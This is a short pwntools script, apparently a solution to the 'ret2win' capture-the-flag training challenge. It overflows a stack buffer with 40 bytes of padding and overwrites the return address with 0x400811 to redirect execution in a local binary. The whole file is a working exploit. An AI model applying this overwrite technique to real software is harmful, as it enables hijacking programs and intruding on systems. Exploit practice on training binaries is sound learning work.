from pwn import *
target=process('./ret2win')

#inital payload
payload="A"*40

#return address
ret2win=0x400811

#final payload
payload+=p64(ret2win)

#send payload
target.sendline(payload)

target.interactive()


